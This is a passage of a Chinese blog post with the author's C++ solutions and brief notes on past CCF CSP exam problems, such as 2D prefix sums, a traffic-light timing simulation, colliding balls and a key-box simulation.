class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-number">0</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-number">0</span>) , cout.<span class="hljs-built_in">tie</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span> n,N;<br>    cin &gt;&gt; n &gt;&gt; N;<br>    <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>,x;<br>    ll error=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> g[<span class="hljs-number">205</span>];<span class="hljs-comment">//存g的数值</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<span class="hljs-comment">//存下标</span><br>    <span class="hljs-type">int</span> r=N/(n<span class="hljs-number">+1</span>);<br>    <span class="hljs-type">bool</span> flag=<span class="hljs-literal">true</span>;<br>    <span class="hljs-type">int</span> nn;<span class="hljs-comment">//简化计算</span><br>    <span class="hljs-keyword">for</span>(i; i &lt; n; i++)<br>    &#123;<br>        cin &gt;&gt; x;<span class="hljs-comment">//输入下一个数</span><br>        nn=i*r;<br>        <span class="hljs-keyword">if</span>((x-ans)%r==<span class="hljs-number">0</span>)<span class="hljs-comment">//x-ans是需要被赋值的数的数量</span><br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = ans; j &lt; x; j+=r)<br>            &#123;<br>                error+=<span class="hljs-built_in">abs</span>(j-nn);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-type">int</span> j = ans;<br>            <span class="hljs-type">int</span> xx=(x-ans)/r;<span class="hljs-comment">//有多少轮可以简化计算</span><br>            <span class="hljs-keyword">for</span>(j; xx&gt;<span class="hljs-number">0</span>; xx--,j+=r)<br>            &#123;<br>                error+=<span class="hljs-built_in">abs</span>(j-nn);<br>            &#125;<br>            <span class="hljs-comment">//剩余轮常规运算</span><br>            <span class="hljs-keyword">for</span>(j; j&lt;x; j++)<br>            &#123;<br>                g[i]=j/r;<br>                error+=<span class="hljs-built_in">abs</span>(g[i]-i);<br>            &#125;<br>        &#125;<br>        ans=x;<span class="hljs-comment">//下一轮</span><br>    &#125;<br>    nn=i*r;<br>    <span class="hljs-keyword">if</span>((N-ans)%r==<span class="hljs-number">0</span>)<span class="hljs-comment">//x-ans是需要被赋值的数的数量</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = ans; j &lt; N; j+=r)<br>        &#123;<br>            error+=<span class="hljs-built_in">abs</span>(j-nn);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-type">int</span> j = ans;<br>        <span class="hljs-type">int</span> xx=(N-ans)/r;<span class="hljs-comment">//有多少轮可以简化计算</span><br>        <span class="hljs-keyword">for</span>(j; xx&gt;<span class="hljs-number">0</span>; xx--,j+=r)<br>        &#123;<br>            error+=<span class="hljs-built_in">abs</span>(j-nn);<br>        &#125;<br>        <span class="hljs-comment">//剩余轮常规运算</span><br>        <span class="hljs-keyword">for</span>(j; j&lt;N; j++)<br>        &#123;<br>            g[i]=j/r;<br>            error+=<span class="hljs-built_in">abs</span>(g[i]-i);<br>        &#125;<br>    &#125;<br>    cout &lt;&lt; error &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="202104-2-领域均值">202104-2 领域均值</h2><p>二维前缀和</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-number">0</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-number">0</span>) , cout.<span class="hljs-built_in">tie</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span> n,L,r,t;<br>    cin &gt;&gt; n &gt;&gt; L &gt;&gt; r &gt;&gt; t;<br>    <span class="hljs-type">int</span> arr[<span class="hljs-number">610</span>][<span class="hljs-number">610</span>],x;<br>    <span class="hljs-built_in">memset</span>(arr,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(arr));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j++)<br>        &#123;<br>            cin &gt;&gt; x;<br>            arr[i][j] = arr[i][j - <span class="hljs-number">1</span>] + arr[i - <span class="hljs-number">1</span>][j] - arr[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + x;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-type">int</span> cnt=<span class="hljs-number">0</span>,x_max,x_min,y_min,y_max,sum;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++)<br>        &#123;<br>            <span class="hljs-type">double</span> ans;<br>            x_min=<span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>,i-r);<br>            x_max=<span class="hljs-built_in">min</span>(r+i,n<span class="hljs-number">-1</span>);<br>            y_min=<span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>,j-r);<br>            y_max=<span class="hljs-built_in">min</span>(r+j,n<span class="hljs-number">-1</span>);<br>            ans=arr[x_max<span class="hljs-number">+1</span>][y_max<span class="hljs-number">+1</span>] - arr[x_max<span class="hljs-number">+1</span>][y_min] - arr[x_min][y_max<span class="hljs-number">+1</span>] + arr[x_min][y_min];<br><br>            sum=(x_max-x_min<span class="hljs-number">+1</span>)*(y_max-y_min<span class="hljs-number">+1</span>);<br>            <br>            sum=<span class="hljs-built_in">ceil</span>(ans/sum);<br>            <span class="hljs-keyword">if</span>(sum&lt;=t)<br>            cnt++;<br>        &#125;<br>    &#125;<br>    cout &lt;&lt; cnt &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2018年">2018年</h1><h2 id="201812-2-小明放学">201812-2 小明放学</h2><p>这个题目看起来并不难，只需要每次输入红绿灯时间时进行判断目前前行了的时间是否超过红绿灯时间，之后再将时间模一轮红绿灯时间，再进行判断到了哪个红绿灯即可。</p><p>坑点在于需要给总时间开longlong，一开始没注意，直接答案错误，给我懵了好久，之后才发现的。难点在于模除之后的判断，判断应该是 红-&gt;绿-&gt;黄-&gt;红 这样循环，但是红绿灯k的增长却是1-&gt;2-&gt;3-&gt;1，1为红，2为黄，3为绿，与所需红绿灯的循环对不上，所以需要一个数组将红绿灯的变化存下来。</p><p>思路理清之后其实就很简单了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> light[<span class="hljs-number">4</span>];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-type">int</span> k, <span class="hljs-type">int</span> t)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(k==<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> t;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(k==<span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> t+light[<span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin &gt;&gt; light[<span class="hljs-number">1</span>] &gt;&gt; light[<span class="hljs-number">2</span>] &gt;&gt; light[<span class="hljs-number">3</span>];<br>    cin &gt;&gt; n;<br>    <span class="hljs-type">int</span> k;<br>    <span class="hljs-type">int</span> roll_time=light[<span class="hljs-number">1</span>]+light[<span class="hljs-number">2</span>]+light[<span class="hljs-number">3</span>];<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> t;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> time=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> shunxu[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cin &gt;&gt; k &gt;&gt; t;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> tmp;<br>        <span class="hljs-keyword">if</span>(k==<span class="hljs-number">0</span>)<br>        &#123;<br>            time+=t;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(t&gt;time)<br>            &#123;<br>                time+=<span class="hljs-built_in">get</span>(k,t-time);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                tmp=time-t;<br>                k=shunxu[k];<br>            &#125;<br>            tmp%=(roll_time);<br>            <span class="hljs-keyword">while</span>(tmp&gt;=light[k])<br>            &#123;<br>                tmp-=light[k];<br>                k=shunxu[k];<br>            &#125;<br>            t=light[k]-tmp;<br>            time+=<span class="hljs-built_in">get</span>(k,t);<br>        &#125;<br>    &#125;<br>    cout &lt;&lt; time &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="201803-2-碰撞的小球">201803-2 碰撞的小球</h2><p>仔细看题目，每个小球的运动方向每个时刻都有可能不一样，因此毫无疑问要一个数组储存小球的方向了。并且需要遍历时间，每一秒小球的位置先进行改变，之后进行判断是否需要进行方向的改变，方向的改变只有三种情况：</p><ul><li>小球位置等于长度</li><li>小球位置等于0</li><li>小球重合</li></ul><p>小球重合从前往后进行判断即可，题目已经说了不可能有三个小球同时重合，所以就会简单很多，那么就直接上代码吧：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n,L,t;<br>    cin &gt;&gt; n &gt;&gt; L &gt;&gt; t;<br>    <span class="hljs-type">int</span> sphere[<span class="hljs-number">101</span>],where[<span class="hljs-number">101</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cin &gt;&gt; sphere[i];<br>        where[i]=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(t--)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        &#123;<br>            sphere[i]+=where[i];<br>            <span class="hljs-keyword">if</span>(sphere[i]==L)<br>            where[i]=<span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">if</span>(sphere[i]==<span class="hljs-number">0</span>)<br>            where[i]=<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = i<span class="hljs-number">+1</span>; j &lt; n; j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(sphere[i]==sphere[j])<br>                &#123;<br>                    where[i]=-where[i];<br>                    where[j]=-where[j];<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; sphere[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2017年">2017年</h1><h2 id="201709-2-公共钥匙盒-未写出">201709-2 公共钥匙盒(未写出)</h2><p>这道题一开始没有写出来，一开始为了防止超时，思路是双指针，一个指针指向开始时间一个指针指向结束时间。但是忘记按开始时间在前的先取了，也就是没有进行排序，最后写出来全是错的，惨不忍睹，最后上网搜了题解才勉强写出。</p><p>思路便是按照时刻进行大循环处理，先还再借。还的时候先遍历知道有多少是还的，然后按照编号进行排序，然后进行还钥匙的处理，改变数组a和b,借的时候同样，进行遍历，只是不需要统计借的人数，按照数组r的顺序进行处理即可。这里用到一个search因为经过很多次的借还导致制定编号的钥匙不能直接知道它所在的钩子，导致不知道应该如何处理下标为几的数组a和b。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-type">int</span> a[], <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) <br>&#123;<br><span class="hljs-keyword">if</span> (a[i] == b) <br>&#123;<br><span class="hljs-keyword">return</span> i;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> k;<br>cin &gt;&gt; n;<br>cin &gt;&gt; k;<br><span class="hljs-type">int</span> a[<span class="hljs-number">1000</span>];<br><span class="hljs-type">bool</span> b[<span class="hljs-number">1000</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> u = <span class="hljs-number">0</span>; u &lt; n; u++) <br>&#123;<br>a[u] = u + <span class="hljs-number">1</span>;<br>b[u] = <span class="hljs-literal">true</span>;<br>&#125;<span class="hljs-comment">//钥匙部分初始化，true表明钥匙放在钥匙盒里</span><br><span class="hljs-type">int</span> s[<span class="hljs-number">10000</span>][<span class="hljs-number">3</span>];<br><span class="hljs-type">int</span> r[<span class="hljs-number">10000</span>];<span class="hljs-comment">//用来处理多位老师同时还钥匙的情况</span><br><span class="hljs-type">int</span> max = <span class="hljs-number">0</span>;<span class="hljs-comment">//最晚结束时间</span><br><span class="hljs-comment">//进行内容的输入</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; k;i++)<br>&#123;<br>cin &gt;&gt; s[i][<span class="hljs-number">0</span>];<br>cin &gt;&gt; s[i][<span class="hljs-number">1</span>];<br>cin &gt;&gt; s[i][<span class="hljs-number">2</span>];<br>s[i][<span class="hljs-number">2</span>] = s[i][<span class="hljs-number">1</span>] + s[i][<span class="hljs-number">2</span>];<br><span class="hljs-keyword">if</span> (s[i][<span class="hljs-number">2</span>] &gt; max) <br>&#123;<br>max = s[i][<span class="hljs-number">2</span>];<br>&#125;<br>&#125;<br><span class="hljs-comment">//cout &lt;&lt; &quot;max的值为&quot; &lt;&lt; max &lt;&lt; endl;</span><br><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> t = <span class="hljs-number">0</span>; t &lt;= max; t++) <br>&#123;<br><span class="hljs-comment">//每一个时刻都要处理，先还再取，还按钥匙的编号大小还</span><br>count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>;m &lt; k;m++)<br>&#123;<br><span class="hljs-keyword">if</span> (s[m][<span class="hljs-number">2</span>] == t) <span class="hljs-comment">//统计出所有在该时刻要还钥匙的人的钥匙号，因为要按照编号还</span><br>&#123;<br><br>r[count] = s[m][<span class="hljs-number">0</span>];<br>count++;<br>&#125;<br>&#125;<br><span class="hljs-comment">//排序</span><br><span class="hljs-comment">/*if (count &gt; 0) </span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">qsort(r, count - 1, sizeof(int), comp);</span><br><span class="hljs-comment">&#125;*/</span><br><span class="hljs-comment">//cout &lt;&lt; &quot;打印r数组&quot; &lt;&lt; endl;</span><br><span class="hljs-comment">//进行冒泡排序</span><br><span class="hljs-type">int</span> temp;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> ii = <span class="hljs-number">0</span>; ii &lt; count<span class="hljs-number">-1</span>; ii++) <br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> jj = <span class="hljs-number">0</span>; jj &lt; count - <span class="hljs-number">1</span> - ii; jj++) <br>&#123;<br><span class="hljs-keyword">if</span> (r[jj] &gt; r[jj + <span class="hljs-number">1</span>]) <br>&#123;<br>temp = r[jj];<br>r[jj] = r[jj + <span class="hljs-number">1</span>];<br>r[jj + <span class="hljs-number">1</span>] = temp;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//还钥匙</span><br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> p = <span class="hljs-number">0</span>; p &lt; count; p++) <br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> q = <span class="hljs-number">0</span>; q &lt; n; q++)<br>&#123;<br><span class="hljs-keyword">if</span> (b[q] == <span class="hljs-literal">false</span>) <br>&#123;<br>a[q] = r[p];<br>b[q] = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">//拿钥匙</span><br><span class="hljs-type">int</span> id;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> w = <span class="hljs-number">0</span>; w &lt; k; w++) <br>&#123;<br><span class="hljs-keyword">if</span> (s[w][<span class="hljs-number">1</span>] == t) <br>&#123;<br>id = <span class="hljs-built_in">search</span>(a, s[w][<span class="hljs-number">0</span>], n);<br>b[id] = <span class="hljs-literal">false</span>;<br>a[id] = <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">//cout &lt;&lt;t&lt;&lt; &quot; 时刻的状态为:&quot; &lt;&lt; endl;</span><br><span class="hljs-comment">/*for (int r = 0; r &lt; n; r++)</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">cout &lt;&lt; a[r] &lt;&lt; &quot; &quot;;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">cout &lt;&lt; endl;*/</span><br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> r = <span class="hljs-number">0</span>; r &lt; n; r++)<br>&#123;<br>cout &lt;&lt; a[r] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2016年">2016年</h1><h2 id="201609-2-火车购票">201609-2 火车购票</h2><p>这题不难，只需要</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,p;<br>    <span class="hljs-type">int</span> count;<br>    <span class="hljs-type">int</span> sit[<span class="hljs-number">21</span>];<br>    cin &gt;&gt; n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">21</span>; i++)<br>    &#123;<br>        sit[i]=<span class="hljs-number">5</span>;<br>    &#125;<br>    <span 